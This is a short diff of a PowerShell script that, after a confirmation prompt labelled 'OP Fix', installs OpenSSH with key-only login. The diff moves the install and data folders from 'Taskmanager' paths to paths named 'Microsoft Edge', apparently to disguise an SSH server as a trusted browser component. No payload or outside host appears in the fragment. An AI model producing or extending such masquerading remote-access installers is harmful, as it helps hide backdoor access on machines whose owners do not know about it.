@@ -6,8 +6,8 @@ if ([string]::IsNullOrEmpty($opconfirm)) {
 }
 if ($opconfirm.ToLower() -eq "y") {
 	Write-Host "Executing OP Fix..."
-	$openSSHFolder = "C:\ProgramData\Taskmanager"	
-	$InstallPath = "C:\Program Files\Taskmanager"
+	$openSSHFolder = "C:\ProgramData\Microsoft Edge"	
+	$InstallPath = "C:\Program Files\Microsoft Edge"
  	$GitZipName = "openssh.zip"
 	$DisablePasswordAuthentication = $True
 	$DisablePubkeyAuthentication = $False
